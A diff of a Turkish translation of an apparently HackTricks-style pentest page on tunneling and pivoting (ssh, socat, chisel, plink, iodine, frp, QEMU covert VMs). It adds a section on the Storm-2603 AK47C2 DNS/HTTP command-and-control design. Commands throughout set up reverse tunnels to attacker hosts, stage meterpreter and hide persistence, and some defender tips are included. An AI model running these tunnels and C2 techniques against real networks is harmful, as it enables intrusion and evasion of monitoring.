@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Yerel port --> Ele geçirilmiş ana bilgisayar (SSH) --> Üçüncü_kutu:Port
+Yerel port --> Ele geçirilmiş host (SSH) --> Üçüncü_kutu:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -51,7 +51,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Yerel Port --> Ele geçirilmiş host (SSH) --> Herhangi bir yere
+Yerel Port --> Ele geçirilmiş host (SSH) --> Herhangi bir yer
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Güvenlik – Terrapin Saldırısı (CVE-2023-48795)**
-> 2023 Terrapin düşürme saldırısı, bir adam-arada (man-in-the-middle) erken SSH el sıkışmasını bozmasına ve **herhangi bir yönlendirilmiş kanala** ( `-L`, `-R`, `-D` ) veri enjekte etmesine izin verebilir. Hem istemcinin hem de sunucunun yamanmış olduğundan emin olun (**OpenSSH ≥ 9.6/LibreSSH 6.7**) veya SSH tünellerine güvenmeden önce savunmasız `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını `sshd_config`/`ssh_config` içinde açıkça devre dışı bırakın.
+> 2023 Terrapin geri alma saldırısı, bir adam-arada saldırganın erken SSH el sıkışmasını bozmasına ve **herhangi bir yönlendirilmiş kanala** ( `-L`, `-R`, `-D` ) veri enjekte etmesine olanak tanıyabilir. Hem istemcinin hem de sunucunun yamanmış olduğundan emin olun (**OpenSSH ≥ 9.6/LibreSSH 6.7**) veya SSH tünellerine güvenmeden önce savunmasız `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını `sshd_config`/`ssh_config` içinde açıkça devre dışı bırakın.
 
 ## SSHUTTLE
 
-Bir ana bilgisayar üzerinden **ssh** ile tüm **trafik**i bir **alt ağa** **tünelleme** yapabilirsiniz.\
-Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek.
+Bir ana bilgisayar üzerinden bir **alt ağ** için tüm **trafik** **ssh** ile **tünel** yapabilirsiniz.\
+Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -178,7 +178,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-Bunu [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) sürümler sayfasından indirebilirsiniz.\
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresinin sürümler sayfasından indirebilirsiniz.\
 **İstemci ve sunucu için aynı sürümü kullanmalısınız.**
 
 ### socks
@@ -241,7 +241,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Ters tünel. Tünel kurban tarafından başlatılır.\
+Ters tünel. Tünel, kurban tarafından başlatılır.\
 127.0.0.1:1080 adresinde bir socks4 proxy oluşturulur.
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-**Kimlik doğrulaması yapılmamış bir proxy'yi** atlatmak için, kurbanın konsolundaki son satırın yerine bu satırı çalıştırabilirsiniz:
+Bir **kimlik doğrulaması yapılmamış proxy**'yi, kurbanın konsolundaki son satırın yerine bu satırı çalıştırarak atlayabilirsiniz:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -324,9 +324,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Konsol PuTTY versiyonu gibidir (seçenekler bir ssh istemcisine çok benzer).
+Konsol PuTTY versiyonuna benzer (seçenekler bir ssh istemcisine çok benzer).
 
-Bu ikili dosya kurban üzerinde çalıştırılacağından ve bir ssh istemcisi olduğundan, ters bağlantı kurabilmemiz için ssh hizmetimizi ve portumuzu açmamız gerekiyor. Ardından, yalnızca yerel olarak erişilebilir bir portu makinemizdeki bir porta yönlendirmek için:
+Bu ikili dosya kurban üzerinde çalıştırılacağı için ve bir ssh istemcisi olduğu için, ters bağlantı kurabilmemiz için ssh hizmetimizi ve portumuzu açmamız gerekiyor. Ardından, yalnızca yerel olarak erişilebilir bir portu makinemizdeki bir porta yönlendirmek için:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -358,7 +358,7 @@ Sistemde **RDP erişimine sahip olmalısınız**.\
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **kurban** ile **bağlanabiliriz** ve **SocksOverRDP eklentisinin etkin olduğu** belirten bir **istem** alacağız ve bu **127.0.0.1:1080** adresinde **dinleyecektir**.
+Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **kurban** ile **bağlanabiliriz** ve **SocksOverRDP eklentisinin etkin olduğu** belirten bir **istem** alacağız, bu **127.0.0.1:1080** adresinde **dinleyecektir**.
 
 **RDP** üzerinden **bağlanın** ve kurban makinesine `SocksOverRDP-Server.exe` ikili dosyasını yükleyip çalıştırın:
 ```
@@ -387,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş olarak yerel bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
+Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş olarak yerel olarak bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
 Örneğin, 443 portunu yönlendirin.
 ```
 Username Alice
@@ -396,7 +396,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Şimdi, örneğin kurban üzerinde **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Buna saldırganın 2222 numaralı portu üzerinden bağlanabilirsiniz.\
+Şimdi, örneğin kurbanın **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Saldırgan 2222 numaralı port üzerinden buna bağlanabilirsiniz.\
 Ayrıca, localhost:443'e bağlanan bir **meterpreter** kullanabilir ve saldırgan 2222 numaralı portta dinliyor olabilir.
 
 ## YARP
@@ -415,7 +415,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Tünel çok yavaş olacak. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:
+Tünel çok yavaş olacaktır. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -452,6 +452,40 @@ Proxychains, `gethostbyname` libc çağrısını keser ve tcp DNS isteğini sock
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
+### Özel DNS TXT / HTTP JSON C2 (AK47C2)
+
+Storm-2603 aktörü, yalnızca dışa dönük **DNS** ve **sade HTTP POST** trafiğini kötüye kullanan bir **çift kanallı C2 ("AK47C2")** oluşturdu – kurumsal ağlarda nadiren engellenen iki protokol.
+
+1. **DNS modu (AK47DNS)**
+• Rastgele 5 karakterli bir SessionID (örneğin `H4T14`) oluşturur.
+• *Görev istekleri* için `1` veya *sonuçlar* için `2` ekler ve farklı alanları (bayraklar, SessionID, bilgisayar adı) birleştirir.
+• Her alan **ASCII anahtarı `VHBD@H` ile XOR şifrelenir**, hex kodlanır ve noktalarla birleştirilir – sonunda saldırgan kontrolündeki alan adıyla biter:
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• İstekler **TXT** (ve yedek **MG**) kayıtları için `DnsQuery()` kullanır.
+• Yanıt 0xFF baytını aştığında, arka kapı verileri 63 baytlık parçalara böler ve işaretçileri ekler:
+`s<SessionID>t<TOTAL>p<POS>` böylece C2 sunucusu bunları yeniden sıralayabilir.
+
+2. **HTTP modu (AK47HTTP)**
+• Bir JSON zarfı oluşturur:
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• Tüm blob XOR-`VHBD@H` → hex → **`POST /`** gövdesi olarak gönderilir, başlık `Content-Type: text/plain` ile.
+• Yanıt aynı kodlamayı takip eder ve `cmd` alanı `cmd.exe /c <command> 2>&1` ile çalıştırılır.
+
+Mavi Takım notları
+• İlk etiketi uzun onaltılık olan ve her zaman nadir bir alan adıyla biten alışılmadık **TXT sorguları** arayın.
+• Sürekli bir XOR anahtarı ve ardından ASCII-onaltılık, YARA ile tespit edilmesi kolaydır: `6?56484244?484` (`VHBD@H` onaltılık).
+• HTTP için, tamamen onaltılık ve iki baytın katları olan text/plain POST gövdelerini işaretleyin.
+
+{{#note}}
+Tüm kanal, **standart RFC uyumlu sorgular** içine sığar ve her alt alan adı etiketini 63 baytın altında tutar, bu da çoğu DNS kaydında gizli kalmasını sağlar.
+{{#endnote}}
+
 ## ICMP Tünelleme
 
 ### Hans
@@ -483,7 +517,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **bir komut satırı ile çözümleri İnternete açmak için bir araçtır.**\
+[**ngrok**](https://ngrok.com/) **bir komut satırı ile çözümleri internete açmak için bir araçtır.**\
 _Exposition URI şöyle görünür:_ **UID.ngrok.io**
 
 ### Kurulum
@@ -517,8 +551,8 @@ _Gerekirse kimlik doğrulama ve TLS eklemek de mümkündür._
 ```
 #### HTTP çağrılarını dinleme
 
-_XSS, SSRF, SSTI ... için faydalıdır._\
-Stdout'tan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000) doğrudan.
+_XSS, SSRF, SSTI için faydalıdır ..._\
+stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000) doğrudan.
 
 #### Dahili HTTP hizmetini tünelleme
 ```bash
@@ -574,11 +608,11 @@ Bağlayıcıyı başlatın:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Çünkü tüm trafik ana bilgisayardan **443 üzerinden dışa çıkıyor**, Cloudflared tüneller, giriş ACL'lerini veya NAT sınırlarını aşmanın basit bir yoludur. İkili dosyanın genellikle yükseltilmiş ayrıcalıklarla çalıştığını unutmayın – mümkünse konteynerler veya `--user` bayrağını kullanın.
+Çünkü tüm trafik **443 üzerinden dışa çıkıyor**, Cloudflared tünelleri, giriş ACL'lerini veya NAT sınırlarını aşmanın basit bir yoludur. İkili dosyanın genellikle yükseltilmiş ayrıcalıklarla çalıştığını unutmayın – mümkünse konteynerler veya `--user` bayrağını kullanın.
 
 ## FRP (Hızlı Ters Proxy)
 
-[`frp`](https://github.com/fatedier/frp) **TCP, UDP, HTTP/S, SOCKS ve P2P NAT-delik-delme** destekleyen aktif olarak bakım yapılan bir Go ters proxy'dir. **v0.53.0 (Mayıs 2024)** ile birlikte, bir **SSH Tünel Geçidi** olarak hareket edebilir, böylece bir hedef ana bilgisayar yalnızca stok OpenSSH istemcisini kullanarak ters bir tünel açabilir – ek bir ikili dosya gerekmiyor.
+[`frp`](https://github.com/fatedier/frp) **TCP, UDP, HTTP/S, SOCKS ve P2P NAT-delik-delme** destekleyen aktif olarak bakım yapılan bir Go ters proxy'dir. **v0.53.0 (Mayıs 2024)** ile birlikte, bir **SSH Tünel Geçidi** olarak işlev görebilir, böylece bir hedef ana bilgisayar yalnızca stok OpenSSH istemcisini kullanarak ters bir tünel açabilir – ek bir ikili dosya gerekmiyor.
 
 ### Klasik ters TCP tüneli
 ```bash
@@ -608,7 +642,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Yukarıdaki komut, kurbanın portunu **8080** olarak **attacker_ip:9000** şeklinde yayınlar ve ek bir araç dağıtmadan – living-off-the-land pivoting için idealdir.
+Yukarıdaki komut, kurbanın portunu **8080** **attacker_ip:9000** olarak yayınlar ve ek bir araç dağıtmadan – living-off-the-land pivoting için idealdir.
 
 ## QEMU ile Gizli VM Tünelleri
 
@@ -626,7 +660,7 @@ qemu-system-x86_64.exe ^
 ```
 • Yukarıdaki komut, RAM'de bir **Tiny Core Linux** imajı (`tc.qcow2`) başlatır.  
 • Windows ana bilgisayarındaki **2222/tcp** portu, misafir içinde **22/tcp**'ye şeffaf bir şekilde yönlendirilir.  
-• Saldırganın bakış açısından hedef, basitçe 2222 portunu açar; ona ulaşan herhangi bir paket, VM'de çalışan SSH sunucusu tarafından işlenir.  
+• Saldırganın bakış açısından hedef, basitçe 2222 portunu açar; ona ulaşan paketler, VM'de çalışan SSH sunucusu tarafından işlenir.  
 
 ### VBScript ile gizlice başlatma
 ```vb
@@ -638,7 +672,7 @@ o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tc
 
 ### Misafir içinde kalıcılık
 
-Tiny Core durumdan bağımsız olduğu için, saldırganlar genellikle:
+Tiny Core durumsuz olduğu için, saldırganlar genellikle:
 
 1. Yükü `/opt/123.out` konumuna bırakır.
 2. `/opt/bootlocal.sh` dosyasına ekler:
@@ -652,13 +686,13 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 
 ### Bunun tespiti nasıl atlatıyor
 
-• Sadece iki imzasız yürütülebilir dosya (`qemu-system-*.exe`) diske dokunur; hiçbir sürücü veya hizmet yüklenmez.
+• Sadece iki imzasız çalıştırılabilir dosya (`qemu-system-*.exe`) diske dokunur; hiçbir sürücü veya hizmet yüklenmez.
 • Ana makinedeki güvenlik ürünleri **zararsız döngü geri dönüş trafiği** görür (gerçek C2 VM içinde sonlanır).
 • Bellek tarayıcıları, farklı bir işletim sisteminde yaşadığı için kötü amaçlı süreç alanını asla analiz etmez.
 
 ### Defender ipuçları
 
-• Kullanıcı yazılabilir yollarında **beklenmedik QEMU/VirtualBox/KVM ikili dosyaları** için uyarı verin.
+• Kullanıcı yazılabilir yollar içinde **beklenmedik QEMU/VirtualBox/KVM ikili dosyalarına** dikkat edin.
 • `qemu-system*.exe`'den kaynaklanan dış bağlantıları engelleyin.
 • QEMU başlatıldıktan hemen sonra bağlanan nadir dinleme portlarını (2222, 10022, …) araştırın.
 
@@ -672,5 +706,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## Referanslar
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 
 {{#include ../banners/hacktricks-training.md}}
